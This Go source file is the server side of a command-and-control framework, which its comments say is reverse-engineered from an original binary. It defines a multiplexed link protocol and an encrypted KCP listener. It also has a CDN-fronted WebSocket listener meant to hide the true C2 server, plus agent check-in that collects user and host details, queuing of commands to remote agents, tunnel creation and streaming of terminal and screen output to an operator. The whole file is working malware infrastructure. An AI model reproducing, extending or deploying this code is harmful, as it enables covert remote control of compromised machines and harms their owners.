package c2engine

import (
	"bufio"
	"context"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	kcp "github.com/xtaci/kcp-go/v5"
)

// ============================================================================
// Link Protocol Layer (reverse-engineered from Xq5KwGZr4i package)
// 链路协议层（逆向自原版 Xq5KwGZr4i 包）
// ============================================================================
//
// The binary implements a custom multiplexed link protocol over raw connections.
// Messages are length-prefixed and routed by type to different channels.
// 原版在裸连接上实现自定义多路复用链路协议：消息长度前缀 + 按类型路由到不同信道。
//
// Message types:
//   - Main channel: task data, command results
//   - Config channel: configuration sync
//   - Channel: tunnel/proxy data
//   - Health: heartbeat and health check
//   - Close: connection termination
// LinkMsgType identifies the message channel.
type LinkMsgType byte

const (
	LinkMsgMain   LinkMsgType = 0x01 // Main data channel
	LinkMsgConfig LinkMsgType = 0x02 // Configuration sync
	LinkMsgChan   LinkMsgType = 0x03 // Tunnel/proxy data
	LinkMsgHealth LinkMsgType = 0x04 // Health/heartbeat
	LinkMsgClose  LinkMsgType = 0x05 // Close connection
	LinkMsgRetry  LinkMsgType = 0x06 // Retry flag
)
// Link represents a multiplexed agent connection.
type Link struct {
	ID         string
	ClientID   int64
	conn       net.Conn
	br         *bufio.Reader
	mainCh     chan []byte
	configCh   chan []byte
	chanCh     chan []byte
	healthCh   chan []byte
	closeCh    chan struct{}
	mu         sync.RWMutex
	readTimeout  time.Duration
	writeTimeout time.Duration
	lastActive   time.Time
	flow       *Flow
	addStatus  bool // accepted/rejected flag (WriteAddOk / WriteAddFail)

	// Fragment reassembly state for oversized LinkMsgMain payloads (screenshots,
	// screen frames). Only touched by the link's own communication goroutine.
	fragBuf  []byte
	fragSeen int
	fragTotal int
}
// NewLink creates a new link over an existing connection.
func NewLink(conn net.Conn, br *bufio.Reader, clientID int64, flow *Flow) *Link {
	return &Link{
		ID:           fmt.Sprintf("link_%d_%d", clientID, time.Now().UnixNano()),
		ClientID:     clientID,
		conn:         conn,
		br:           br,
		mainCh:       make(chan []byte, 64),
		configCh:     make(chan []byte, 16),
		chanCh:       make(chan []byte, 64),
		healthCh:     make(chan []byte, 8),
		closeCh:      make(chan struct{}),
		readTimeout:  30 * time.Second,
		writeTimeout: 30 * time.Second,
		lastActive:   time.Now(),
		flow:         flow,
	}
}

// ============================================================================
// XBp86cUq4 equivalent - Link methods
// ============================================================================
// GetShortLenContent reads a length-prefixed message (2-byte length).
func (l *Link) GetShortLenContent() ([]byte, error) {
	// 原版（Xq5KwGZr4i.(*XBp86cUq4).GetShortLenContent @ 0x15f6da0）：经
	// bufio.Reader（PTR_DAT_1dbd9220）读长度；> 0x8000（32KB）→ 错误
	// （FUN_015fe5e0，17 字节串待解）；否则分配并读载荷。
	// Read 2-byte length
	lenBuf := make([]byte, 2)
	if _, err := io.ReadFull(l.br, lenBuf); err != nil {
		return nil, err
	}
	length := binary.BigEndian.Uint16(lenBuf)
	if length > 0x8000 {
		// 原版（FUN_015fe5e0）超长拒绝
		return nil, fmt.Errorf("message too long: %d", length)
	}

	// Read payload
	data := make([]byte, length)
	if _, err := io.ReadFull(l.br, data); err != nil {
		return nil, err
	}

	l.flow.AddInlet(int64(length) + 2)
	l.lastActive = time.Now()
	return data, nil
}
// GetShortContent reads a raw message (no length prefix, reads available data).
func (l *Link) GetShortContent() ([]byte, error) {
	buf := make([]byte, 65536)
	n, err := l.br.Read(buf)
	if err != nil {
		return nil, err
	}
	l.flow.AddInlet(int64(n))
	l.lastActive = time.Now()
	return buf[:n], nil
}
// WriteLenContent writes a length-prefixed message.
func (l *Link) WriteLenContent(data []byte) error {
	// Write 2-byte length + payload
	lenBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(lenBuf, uint16(len(data)))

	if _, err := l.conn.Write(lenBuf); err != nil {
		return err
	}
	if _, err := l.conn.Write(data); err != nil {
		return err
	}

	l.flow.AddExport(int64(len(data)) + 2)
	return nil
}
// ReadFlagRetry reads with retry logic.
func (l *Link) ReadFlagRetry() (LinkMsgType, []byte, error) {
	for i := 0; i < 3; i++ {
		data, err := l.GetShortLenContent()
		if err != nil {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		if len(data) > 0 {
			return LinkMsgType(data[0]), data[1:], nil
		}
	}
	return 0, nil, fmt.Errorf("read retry exhausted")
}
// ReadLen reads a length-prefixed payload (2-byte big-endian length).
// Original binary: Xq5KwGZr4i.(*XBp86cUq4).ReadLen.
func (l *Link) ReadLen() ([]byte, error) {
	return l.GetShortLenContent()
}
// ReadFlag reads a single flag byte followed by payload.
// Original binary: Xq5KwGZr4i.(*XBp86cUq4).ReadFlag.
func (l *Link) ReadFlag() (LinkMsgType, []byte, error) {
	data, err := l.GetShortLenContent()
	if err != nil {
		return 0, nil, err
	}
	if len(data) == 0 {
		return 0, nil, fmt.Errorf("empty flag message")
	}
	return LinkMsgType(data[0]), data[1:], nil
}
// GetLen returns the length of the next buffered message.
// Original binary: Xq5KwGZr4i.(*XBp86cUq4).GetLen.
func (l *Link) GetLen() (int, error) {
	lenBuf := make([]byte, 2)
	if _, err := io.ReadFull(l.conn, lenBuf); err != nil {
		return 0, err
	}
	return int(binary.BigEndian.Uint16(lenBuf)), nil
}
// GetV returns the message type value of the next message.
// Original binary: Xq5KwGZr4i.(*XBp86cUq4).GetV.
func (l *Link) GetV() (LinkMsgType, error) {
	data, err := l.GetShortLenContent()
	if err != nil {
		return 0, err
	}
	if len(data) == 0 {
		return 0, nil
	}
	return LinkMsgType(data[0]), nil
}
// SendV writes a typed message header (type byte only).
// Original binary: Xq5KwGZr4i.(*XBp86cUq4).SendV.
func (l *Link) SendV(msgType LinkMsgType) error {
	return l.writeMsg(msgType, nil)
}
// SendInfo writes a typed message with a payload.
// Original binary: Xq5KwGZr4i.(*XBp86cUq4).SendInfo.
func (l *Link) SendInfo(msgType LinkMsgType, data []byte) error {
	return l.writeMsg(msgType, data)
}
// SetAlive refreshes the link activity timestamp.
// Original binary: Xq5KwGZr4i.(*XBp86cUq4).SetAlive.
func (l *Link) SetAlive() {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.lastActive = time.Now()
}
// SetReadDeadlineBySecond sets read deadline in seconds.
func (l *Link) SetReadDeadlineBySecond(seconds int) {
	l.conn.SetReadDeadline(time.Now().Add(time.Duration(seconds) * time.Second))
}
// SetWriteDeadlineBySecond sets write deadline in seconds.
func (l *Link) SetWriteDeadlineBySecond(seconds int) {
	l.conn.SetWriteDeadline(time.Now().Add(time.Duration(seconds) * time.Second))
}

// ============================================================================
// Message routing (WriteMain, WriteConfig, WriteChan, WriteClose)
// ============================================================================
// WriteMain sends data on the main channel.
func (l *Link) WriteMain(data []byte) error {
	return l.writeMsg(LinkMsgMain, data)
}
// WriteConfig sends configuration data.
func (l *Link) WriteConfig(data []byte) error {
	return l.writeMsg(LinkMsgConfig, data)
}
// WriteChan sends tunnel/proxy channel data.
func (l *Link) WriteChan(data []byte) error {
	return l.writeMsg(LinkMsgChan, data)
}
// WriteClose sends a close message.
func (l *Link) WriteClose() error {
	return l.writeMsg(LinkMsgClose, nil)
}

func (l *Link) writeMsg(msgType LinkMsgType, data []byte) error {
	msg := make([]byte, 1+len(data))
	msg[0] = byte(msgType)
	copy(msg[1:], data)
	return l.WriteLenContent(msg)
}

// ============================================================================
// Info methods
// ============================================================================
// GetLinkInfo returns link metadata.
func (l *Link) GetLinkInfo() map[string]interface{} {
	return map[string]interface{}{
		"id":         l.ID,
		"client_id":  l.ClientID,
		"local_addr": l.LocalAddr().String(),
		"remote_addr": l.RemoteAddr().String(),
		"last_active": l.lastActive,
	}
}
// SendHealthInfo sends a health/heartbeat message.
func (l *Link) SendHealthInfo() error {
	health := map[string]interface{}{
		"time":   time.Now().Unix(),
		"active": true,
	}
	data, _ := json.Marshal(health)
	return l.writeMsg(LinkMsgHealth, data)
}
// GetHealthInfo reads and validates a health message.
func (l *Link) GetHealthInfo() (map[string]interface{}, error) {
	msgType, data, err := l.ReadFlagRetry()
	if err != nil {
		return nil, err
	}
	if msgType != LinkMsgHealth {
		return nil, fmt.Errorf("expected health msg, got %d", msgType)
	}
	var result map[string]interface{}
	if err := json.Unmarshal(data, &result); err != nil {
		return nil, err
	}
	return result, nil
}
// GetHostInfo reads host configuration info.
func (l *Link) GetHostInfo() (map[string]interface{}, error) {
	msgType, data, err := l.ReadFlagRetry()
	if err != nil {
		return nil, err
	}
	if msgType != LinkMsgConfig {
		return nil, fmt.Errorf("expected config msg, got %d", msgType)
	}
	var result map[string]interface{}
	if err := json.Unmarshal(data, &result); err != nil {
		return nil, err
	}
	return result, nil
}
// GetConfigInfo reads agent configuration.
func (l *Link) GetConfigInfo() (map[string]interface{}, error) {
	return l.GetHostInfo()
}
// GetTaskInfo reads task request from agent.
func (l *Link) GetTaskInfo() ([]byte, error) {
	_, data, err := l.ReadFlagRetry()
	if err != nil {
		return nil, err
	}
	return data, nil
}
// GetAddStatus checks if connection was accepted.
func (l *Link) GetAddStatus() bool {
	select {
	case <-l.closeCh:
		return false
	default:
		return true
	}
}
// WriteAddOk marks the connection as accepted (inverse of WriteAddFail).
// Original binary: Xq5KwGZr4i.(*XBp86cUq4).WriteAddOk.
func (l *Link) WriteAddOk() {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.addStatus = true
}
// WriteAddFail marks connection as failed.
func (l *Link) WriteAddFail() {
	select {
	case <-l.closeCh:
	default:
		close(l.closeCh)
	}
	l.mu.Lock()
	l.addStatus = false
	l.mu.Unlock()
}
// LocalAddr returns the local address.
func (l *Link) LocalAddr() net.Addr {
	return l.conn.LocalAddr()
}
// RemoteAddr returns the remote address.
func (l *Link) RemoteAddr() net.Addr {
	return l.conn.RemoteAddr()
}
// SetDeadline sets both read and write deadlines.
func (l *Link) SetDeadline(t time.Time) error {
	return l.conn.SetDeadline(t)
}
// SetWriteDeadline sets the write deadline.
func (l *Link) SetWriteDeadline(t time.Time) error {
	return l.conn.SetWriteDeadline(t)
}
// SetReadDeadline sets the read deadline.
func (l *Link) SetReadDeadline(t time.Time) error {
	return l.conn.SetReadDeadline(t)
}

// Close closes the link
func (l *Link) Close() error {
	l.WriteClose()
	return l.conn.Close()
}

// ============================================================================
// KCP Listener (reverse-engineered from original binary)
// ============================================================================

// KCPListener implements a KCP-based C2 listener
// KCP provides reliable ordered delivery over UDP with low latency
type KCPListener struct {
	mu        sync.RWMutex
	ID        int64
	Addr      string
	VerifyKey string
	EncryptSalt string
	listener  *kcp.Listener
	isRunning bool
	stopCh    chan struct{}
	sessions  map[string]*Link
}

// NewKCPListener creates a KCP C2 listener
func NewKCPListener(id int64, addr, verifyKey, encryptSalt string) *KCPListener {
	return &KCPListener{
		ID:          id,
		Addr:        addr,
		VerifyKey:   verifyKey,
		EncryptSalt: encryptSalt,
		sessions:    make(map[string]*Link),
		stopCh:      make(chan struct{}),
	}
}

// kcpBlockCrypt derives a 32-byte AES key from listener key material. The
// original binary sliced raw concatenated material to 32 bytes, which panics
// at runtime on short keys (typical verify keys like "admin"); pad instead so
// KCP listener startup fails gracefully on short keys. The agent's
// kcpTransport uses the identical derivation.
func kcpBlockCrypt(salt, key string) kcp.BlockCrypt {
	m := []byte(salt + key)
	if len(m) < 32 {
		m = append(m, make([]byte, 32-len(m))...)
	}
	block, _ := kcp.NewAESBlockCrypt(m[:32])
	return block
}

// Start begins listening for KCP connections
func (kl *KCPListener) Start() error {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if kl.isRunning {
		return fmt.Errorf("KCP listener %d already running", kl.ID)
	}

	// KCP with encryption and FEC
	listener, err := kcp.ListenWithOptions(kl.Addr, kcpBlockCrypt(kl.EncryptSalt, kl.VerifyKey), 10, 3)
	if err != nil {
		return fmt.Errorf("KCP listen: %w", err)
	}

	kl.listener = listener
	kl.isRunning = true

	go kl.acceptLoop(listener)
	log.Printf("[KCP Listener %d] Started on %s", kl.ID, kl.Addr)
	return nil
}

func (kl *KCPListener) acceptLoop(listener *kcp.Listener) {
	for {
		select {
		case <-kl.stopCh:
			return
		default:
		}

		listener.SetDeadline(time.Now().Add(1 * time.Second))
		conn, err := listener.AcceptKCP()
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			continue
		}

		// Configure KCP
		conn.SetStreamMode(true)
		conn.SetWriteDelay(false)
		conn.SetNoDelay(1, 10, 2, 1) // fast mode
		conn.SetWindowSize(128, 128)
		conn.SetMtu(1350)

		go kl.handleSession(conn)
	}
}

func (kl *KCPListener) handleSession(conn *kcp.UDPSession) {
	engine := GetEngine()

	// Read initial handshake: "conf" + JSON (FUN_016f3e80 实锤：checkin =
	// 文本命令头 + JSON 载荷；"conf" → NewClient，"host" → NewHost，
	// "stus" → 状态，"task" → 任务记录)。
	// 逐字节读取（原版 bufio，PTR_DAT_1dbd9220）：br 只消费握手数据，
	// 多余字节保留在缓冲中供后续帧读取。
	br := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	hsBuf := make([]byte, 0, 512)
	var handshake map[string]interface{}
	for len(hsBuf) < 4096 {
		b, err := br.ReadByte()
		if err != nil {
			conn.Close()
			return
		}
		hsBuf = append(hsBuf, b)
		if json.Unmarshal(hsBuf, &handshake) == nil {
			break
		}
	}
	if handshake == nil {
		conn.Close()
		return
	}

	// Verify key（客户端结构字段：VerifyKey/Tp/Addr/UserName/HostName/
	// OsName/ProcessName，SQL 模式列实锤）
	vkey, _ := handshake["VerifyKey"].(string)
	if kl.VerifyKey != "" && vkey != kl.VerifyKey {
		Logf("[KCP %d] Rejected connection with wrong key from %s", kl.ID, conn.RemoteAddr())
		conn.Close()
		return
	}

	// Register client（原版 checkin = "conf" 命令 + JSON）
	hostname, _ := handshake["HostName"].(string)
	username, _ := handshake["UserName"].(string)
	osName, _ := handshake["OsName"].(string)
	processName, _ := handshake["ProcessName"].(string)
	arch, _ := handshake["Arch"].(string)

	client, err := engine.NewClient(
		vkey, "kcp", conn.RemoteAddr().String(), "",
		username, hostname, osName, processName, arch,
	)
	if err != nil {
		conn.Close()
		return
	}

	// Create link（共享缓冲读取器）
	link := NewLink(conn, br, client.ID, client.Flow)

	kl.mu.Lock()
	kl.sessions[link.ID] = link
	kl.mu.Unlock()

	defer func() {
		kl.mu.Lock()
		delete(kl.sessions, link.ID)
		kl.mu.Unlock()
		link.Close()
	}()

	Logf("[KCP %d] Agent %d connected (%s@%s)", kl.ID, client.ID, username, hostname)

	// Acknowledge the check-in with the client ID (mirrors the HTTP check-in
	// response); the agent blocks on this before it can poll tasks.
	resp, _ := json.Marshal(CheckinResponse{
		Status:   "ok",
		ClientID: client.ID,
		Interval: 5,
		Timeout:  30,
	})
	if err := link.WriteMain(resp); err != nil {
		return
	}

	// Main communication loop
	kl.communicationLoop(link, client)
}

func (kl *KCPListener) communicationLoop(link *Link, client *Client) {
	engine := GetEngine()
	heartbeatTicker := time.NewTicker(10 * time.Second)
	defer heartbeatTicker.Stop()

	for {
		select {
		case <-kl.stopCh:
			return
		case <-link.closeCh:
			return
		case <-heartbeatTicker.C:
			if err := link.SendHealthInfo(); err != nil {
				return
			}

		default:
			link.SetReadDeadlineBySecond(5)

			msgType, data, err := link.ReadFlagRetry()
			if err != nil {
				continue
			}

			switch msgType {
			case LinkMsgMain:
				var msg map[string]interface{}
				if err := json.Unmarshal(data, &msg); err != nil {
					continue
				}
				// Reassemble fragmented payloads (agent splits oversized messages
				// into {"_frag":k,"_total":n,"_data":base64} frames).
				if _, isFrag := msg["_frag"]; isFrag {
					total, _ := msg["_total"].(float64)
					chunkStr, _ := msg["_data"].(string)
					chunk, err := base64.StdEncoding.DecodeString(chunkStr)
					if err != nil {
						link.fragBuf = nil
						link.fragSeen = 0
						link.fragTotal = 0
						continue
					}
					link.fragBuf = append(link.fragBuf, chunk...)
					link.fragSeen++
					if link.fragSeen < int(total) {
						continue
					}
					data = link.fragBuf
					link.fragBuf = nil
					link.fragSeen = 0
					link.fragTotal = 0
					if err := json.Unmarshal(data, &msg); err != nil {
						continue
					}
				}
				// The verify key is the only credential on the task/result channel:
				// without it, any reachable peer could read queued commands or
				// forge results for any client.
				if kl.VerifyKey != "" {
					vkey, _ := msg["VerifyKey"].(string)
					if vkey != kl.VerifyKey {
						continue
					}
				}
				// Task result (agent posts command_id/result/status).
				if cmdID, ok := msg["CommandID"].(float64); ok {
					result, _ := msg["Result"].(string)
					status, _ := msg["Status"].(string)
					cid, _ := msg["ClientID"].(float64)
					// Live streams (terminal output / screen frames) must be
					// relayed to the web-panel viewers like the HTTP result path
					// does — storing them as task results would leave the
					// operator's terminal/screen sessions silent.
					if !forwardStreamingResult(int64(cid), result) {
						engine.UpdateTask(int64(cmdID), result, status)
					}
					continue
				}
				// Task poll (agent requests pending commands).
				if typ, _ := msg["type"].(string); typ == "task_poll" {
					cid, _ := msg["ClientID"].(float64)
					client := engine.GetClient(int64(cid))
					if client != nil {
						client.UpdateSeen()
					}
					pending := engine.GetAndMarkPendingTasks(int64(cid))
					tasks := make([]TaskItem, 0, len(pending))
					for _, t := range pending {
						tasks = append(tasks, TaskItem{ID: t.ID, Command: t.Command, Timeout: t.Timeout})
					}
					if tasks == nil {
						tasks = []TaskItem{}
					}
					resp, _ := json.Marshal(TaskResponse{Tasks: tasks, Interval: 5})
					if err := link.WriteMain(resp); err != nil {
						return
					}
					continue
				}

			case LinkMsgConfig:
				// Configuration request
				listener := engine.GetListener(kl.ID)
				config := map[string]interface{}{
					"interval": 5,
					"timeout":  30,
				}
				if listener != nil {
					config["interval"] = listener.PingInterval
					config["timeout"] = listener.DisconnectTimeout
					config["encrypt_salt"] = listener.EncryptSalt
				}
				cfgData, _ := json.Marshal(config)
				link.WriteConfig(cfgData)

			case LinkMsgHealth:
				client.UpdateSeen()

			case LinkMsgClose:
				return
			}
		}
	}
}

// Stop stops the KCP listener
func (kl *KCPListener) Stop() error {
	kl.mu.Lock()
	defer kl.mu.Unlock()

	if !kl.isRunning {
		return nil
	}

	close(kl.stopCh)

	// Close all sessions
	for _, link := range kl.sessions {
		link.Close()
	}

	if kl.listener != nil {
		kl.listener.Close()
	}

	kl.isRunning = false
	log.Printf("[KCP Listener %d] Stopped", kl.ID)
	return nil
}

// IsRunning returns whether the listener is active
func (kl *KCPListener) IsRunning() bool {
	kl.mu.RLock()
	defer kl.mu.RUnlock()
	return kl.isRunning
}

// ============================================================================
// KCP Listener Manager
// ============================================================================

// KCPManager manages all KCP listeners
type KCPManager struct {
	mu        sync.RWMutex
	listeners map[int64]*KCPListener
}

var kcpMgr = &KCPManager{
	listeners: make(map[int64]*KCPListener),
}

// GetKCPManager returns the KCP listener manager
func GetKCPManager() *KCPManager {
	return kcpMgr
}

// StartListener starts a KCP listener
func (km *KCPManager) StartListener(config *Listener) error {
	km.mu.Lock()
	defer km.mu.Unlock()

	if _, exists := km.listeners[config.ID]; exists {
		return fmt.Errorf("KCP listener %d already active", config.ID)
	}

	kl := NewKCPListener(config.ID, config.ListenAddr, config.VerifyKey, config.EncryptSalt)
	if err := kl.Start(); err != nil {
		return err
	}

	km.listeners[config.ID] = kl
	return nil
}

// StopListener stops a KCP listener
func (km *KCPManager) StopListener(id int64) error {
	km.mu.Lock()
	defer km.mu.Unlock()

	kl, exists := km.listeners[id]
	if !exists {
		return nil
	}

	kl.Stop()
	delete(km.listeners, id)
	return nil
}

// ============================================================================
// Tunnel creation on link (matching binary's tunnel handler)
// ============================================================================

// CreateTunnelOnLink creates a tunnel over an existing link
func CreateTunnelOnLink(bufferSize int, link *Link, tunnel *Tunnel) (interface{}, error) {
	// This mirrors the binary's function signature:
	// func(int, *Xq5KwGZr4i.Link, *eSxbx2zKVifD.Tunnel) (b209aM_.AzMICn5, error)

	type TunnelResult struct {
		Success    bool   `json:"success"`
		TunnelID   int64  `json:"tunnel_id"`
		LocalAddr  string `json:"local_addr"`
	}

	// Send tunnel creation request
	req, _ := json.Marshal(map[string]interface{}{
		"type":        "tunnel_create",
		"tunnel_id":   tunnel.ID,
		"port":        tunnel.Port,
		"mode":        tunnel.Mode,
		"target_addr": tunnel.TargetAddr,
	})

	if err := link.WriteChan(req); err != nil {
		return nil, err
	}

	// Wait for response
	_, resp, err := link.ReadFlagRetry()
	if err != nil {
		return nil, err
	}

	var result TunnelResult
	if err := json.Unmarshal(resp, &result); err != nil {
		return nil, err
	}

	if !result.Success {
		return nil, fmt.Errorf("tunnel creation failed")
	}

	return &result, nil
}

// ============================================================================
// CDN WebSocket Mode
// ============================================================================

// CDNWebSocketListener implements WebSocket-over-CDN C2
// Agents connect through CDN edge nodes, hiding the true C2 server
type CDNWebSocketListener struct {
	mu         sync.RWMutex
	ID         int64
	CDNURL     string   // CDN edge URL (e.g., https://cdn.example.com)
	OriginHost string   // Origin server hostname
	VerifyKey  string
	isRunning  bool
	stopCh     chan struct{}
	sessions   map[string]*Link
}

// NewCDNWebSocketListener creates a CDN WebSocket listener
func NewCDNWebSocketListener(id int64, cdnURL, originHost, verifyKey string) *CDNWebSocketListener {
	return &CDNWebSocketListener{
		ID:         id,
		CDNURL:     cdnURL,
		OriginHost: originHost,
		VerifyKey:  verifyKey,
		sessions:   make(map[string]*Link),
		stopCh:     make(chan struct{}),
	}
}

// Start begins the CDN WebSocket listener
func (cws *CDNWebSocketListener) Start() error {
	cws.mu.Lock()
	defer cws.mu.Unlock()

	if cws.isRunning {
		return fmt.Errorf("CDN WS listener %d already running", cws.ID)
	}

	cws.isRunning = true

	// CDN WebSocket mode operates through the main HTTP server
	// The agent connects to CDN → CDN proxies to origin via WebSocket
	// The origin server handles WebSocket upgrade and tunnel management
	log.Printf("[CDN WS %d] Started (CDN: %s, origin: %s)", cws.ID, cws.CDNURL, cws.OriginHost)
	return nil
}

// Stop stops the CDN WebSocket listener
func (cws *CDNWebSocketListener) Stop() error {
	cws.mu.Lock()
	defer cws.mu.Unlock()

	if !cws.isRunning {
		return nil
	}

	close(cws.stopCh)
	for _, link := range cws.sessions {
		link.Close()
	}

	cws.isRunning = false
	return nil
}

// HandleCDNWebSocketConnection handles a WebSocket connection from CDN
func (cws *CDNWebSocketListener) HandleCDNWebSocketConnection(conn net.Conn, verifyKey string) error {
	engine := GetEngine()

	// For CDN WebSocket, use the link protocol directly over the TCP/WS connection
	// KCP is used for UDP-based agents; WebSocket already provides reliable delivery
	link := NewLink(conn, bufio.NewReader(conn), 0, &Flow{})

	cws.mu.Lock()
	cws.sessions[link.ID] = link
	cws.mu.Unlock()

	defer func() {
		cws.mu.Lock()
		delete(cws.sessions, link.ID)
		cws.mu.Unlock()
		link.Close()
	}()

	// Registration handshake
	_, data, err := link.ReadFlagRetry()
	if err != nil {
		return err
	}

	var checkin CheckinRequest
	if err := json.Unmarshal(data, &checkin); err != nil {
		return err
	}

	if cws.VerifyKey != "" && checkin.VerifyKey != cws.VerifyKey {
		return fmt.Errorf("verify key mismatch")
	}

	client, err := engine.NewClient(
		checkin.VerifyKey, "cdn_ws", conn.RemoteAddr().String(),
		checkin.LocalIP, checkin.UserName, checkin.HostName,
		checkin.OsName, checkin.ProcessName, checkin.Arch,
	)
	if err != nil {
		return err
	}
	link.ClientID = client.ID

	Logf("[CDN WS %d] Agent %d connected (%s@%s)", cws.ID, client.ID, checkin.UserName, checkin.HostName)

	// Main loop
	for {
		link.SetReadDeadlineBySecond(30)
		msgType, data, err := link.ReadFlagRetry()
		if err != nil {
			return err
		}

		switch msgType {
		case LinkMsgMain:
			var result struct {
				CommandID int64  `json:"command_id"`
				Result    string `json:"result"`
				Status    string `json:"status"`
			}
			json.Unmarshal(data, &result)
			engine.UpdateTask(result.CommandID, result.Result, result.Status)

		case LinkMsgHealth:
			client.UpdateSeen()

		case LinkMsgClose:
			return nil
		}
	}
}

// ============================================================================
// Unified agent session handler (the main session function from binary)
// ============================================================================

// HandleAgentSession manages an agent's complete session lifecycle
// This mirrors the binary's function:
//   func(*XBp86cUq4, *Client, string, []uint8, string, func(), *Flow, bool) error
func HandleAgentSession(link *Link, client *Client, mode string, config []byte,
	listenerKey string, onClose func(), flow *Flow, noStore bool) error {

	engine := GetEngine()

	// Send initial configuration
	initConfig := map[string]interface{}{
		"mode":      mode,
		"interval":  5,
		"encrypt":   len(config) > 0,
	}
	cfgData, _ := json.Marshal(initConfig)
	link.WriteConfig(cfgData)

	// If encrypted, send encryption config
	if len(config) > 0 {
		link.WriteConfig(config)
	}

	heartbeat := time.NewTicker(10 * time.Second)
	defer heartbeat.Stop()

	for {
		select {
		case <-heartbeat.C:
			if err := link.SendHealthInfo(); err != nil {
				if onClose != nil {
					onClose()
				}
				return err
			}

		default:
			link.SetReadDeadlineBySecond(5)

			msgType, data, err := link.ReadFlagRetry()
			if err != nil {
				continue
			}

			switch msgType {
			case LinkMsgMain:
				// Handle task result or task request
				var msg map[string]interface{}
				if err := json.Unmarshal(data, &msg); err == nil {
					if cmdID, ok := msg["CommandID"].(float64); ok {
						result, _ := msg["Result"].(string)
						status, _ := msg["Status"].(string)
						engine.UpdateTask(int64(cmdID), result, status)
					}
				}

			case LinkMsgConfig:
				// Agent is requesting configuration
				listener := engine.GetListener(0) // Get by listener ID
				if listener == nil {
					continue
				}
				cfg := map[string]interface{}{
					"interval":  listener.PingInterval,
					"timeout":   listener.DisconnectTimeout,
				}
				cfgBytes, _ := json.Marshal(cfg)
				link.WriteConfig(cfgBytes)

			case LinkMsgChan:
				// Tunnel data - forward to tunnel handler
				Logf("Link %s: channel data (%d bytes)", link.ID, len(data))

			case LinkMsgHealth:
				client.UpdateSeen()

			case LinkMsgClose:
				if onClose != nil {
					onClose()
				}
				return nil
			}
		}
	}
}

// ============================================================================
// Context-aware listener start helpers
// ============================================================================

// StartListenerByMode starts a listener based on its mode
func StartListenerByMode(config *Listener) error {
	switch config.Mode {
	case ListenerModeHTTP, ListenerModeHTTPS:
		lm := GetListenerManager()
		return lm.StartListener(config)

	case ModeKCP:
		km := GetKCPManager()
		return km.StartListener(config)

	case ListenerModeDNS:
		dl := NewDNSListener(config.ID, config.DNSDomain, config.PublicDNS, config.VerifyKey, config.MaxDNSsize)
		return dl.Start()

	case ListenerModeCDNWebSocket:
		lm := GetListenerManager()
		return lm.StartListener(config)

	default:
		return fmt.Errorf("unsupported listener mode: %s", config.Mode)
	}
}

// StopListenerByMode stops a listener based on its mode
func StopListenerByMode(config *Listener) error {
	switch config.Mode {
	case ListenerModeHTTP, ListenerModeHTTPS:
		return GetListenerManager().StopListener(config.ID)

	case ModeKCP:
		return GetKCPManager().StopListener(config.ID)

	case ListenerModeCDNWebSocket:
		return GetListenerManager().StopListener(config.ID)

	default:
		return fmt.Errorf("unsupported listener mode: %s", config.Mode)
	}
}

// Ensure io import context is used
var _ = context.Background
var _ = io.ReadFull
